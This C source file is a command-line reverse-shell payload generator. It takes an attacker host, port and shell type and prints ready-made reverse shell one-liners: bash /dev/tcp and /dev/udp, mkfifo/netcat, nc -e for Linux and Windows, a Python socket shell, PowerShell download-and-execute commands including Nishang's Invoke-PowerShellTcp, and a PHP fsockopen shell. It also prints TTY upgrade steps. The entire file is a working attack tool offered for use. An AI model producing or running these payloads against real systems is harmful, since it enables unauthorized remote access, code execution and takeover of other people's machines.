#include <stdio.h>
#include <string.h>

int upgrade(char* lhost,char* lport){
    printf("\nUpgrade your shells with\n");
    printf("Python:\n");
    printf("python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n\n");
    printf("Or script:\n");
    printf("script -qc /bin/bash /dev/null\n\n");
    printf("Then CTRL+Z to background the process\n");
    printf("tput lines;tput cols => to get your terminal's ROWS and COLUMNS\n");
    printf("stty raw -echo; fg then press ENTER twice\n");
    printf("stty rows ROWS# and cols COLS#\n");
    printf("exportTERM=xterm => to be able to use the clear command\n");
}

int rev_shell(char* lhost,char* lport,char* type) {
    int check;
    check = strcmp(type,"bash");
    if (check == 0){
        printf("Bash TCP:\nbash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'\n\n",lhost,lport);
        printf("Bash UDP:\nbash -c 'bash -i >& /dev/udp/%s/%s 0>&1'\n",lhost,lport);
    }
    check = strcmp(type,"mkfifo");
    if (check == 0){
        printf("Mkfifo:\nrm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f\n",lhost,lport);
    }
    check = strcmp(type,"nc");
    if (check == 0){
        printf("Netcat:\nLinux:\nnc -e /bin/sh %s %s\n\n",lhost,lport);
        printf("nc -e /bin/bash %s %s\n\n",lhost,lport);
        printf("nc -c bash %s %s\n\n",lhost,lport);
        printf("Windows:\nnc -e cmd.exe %s %s\n\n",lhost,lport);
        printf("nc -e -e powershell.exe %s %s\n",lhost,lport);
    }
    check = strcmp(type,"python");
    if (check == 0){
        printf("Python:\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);");
        printf("s.connect((\"%s\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);",lhost,lport);
        printf("subprocess.call([\"/bin/sh\",\"-i\"])'\n\n");
        printf("import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n");
        printf("s.connect((\"%s\",%s))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\n",lhost,lport);
        printf("subprocess.call([\"/bin/sh\",\"-i\"])\n");
    }
    check = strcmp(type,"powershell");
    if (check == 0){
        printf("Powershell:\nEXE:\npowershell \"(new-object System.Net.WebClient).Downloadfile('http://%s/evil.exe','evil.exe')\"\n\n",lhost);
        printf("PS1:\nwget \"https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1\" -O shell.ps1\n");
        printf("echo \"Invoke-PowerShellTcp -Reverse -IPAddress %s -Port %s\" >> shell.ps1\n",lhost,lport);
        printf("\nPayload: powershell \"IEX(New-Object Net.WebClient).downloadString('http://%s/shell.ps1')\"\n",lhost);
    }
    check = strcmp(type,"php");
    if (check == 0){
        printf("PHP:\n<?php\n$sock=fsockopen(\"%s\",%s);\n$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);\n?>\n",lhost,lport);
    }    
}

int main(int argc, char* argv[]) { 
    int check_types;
    int check_upgrade;
    if (argc == 4){ 
        rev_shell(argv[1],argv[2],argv[3]);
        
    }
    else if (argc == 2){ 
        check_types = strcmp(argv[1],"types");
        check_upgrade = strcmp(argv[1],"upgrades");
        if (check_types == 0){
        printf("Available types:\n");
        printf("bash\nmkfifo\nnc\npowershell\npython\nphp\n");
        }
	else if (check_upgrade == 0){
        upgrade(argv[1],argv[2]);
        }
        else {
        printf("Missing or too many arguments. E.G ./rev_shell 127.0.0.1 1337 bash\n\n");
        printf("To see available types: ./rev_shell types\n");
        printf("To see shell upgrades: ./rev_shell upgrades\n");
        }
    }
    else {
        printf("Missing or too many arguments. E.G ./rev_shell_g 127.0.0.1 1337 bash\n\n");
        printf("To see available types: ./rev_shell_g types\n");
        printf("To see shell upgrades: ./rev_shell upgrades\n");
    }
}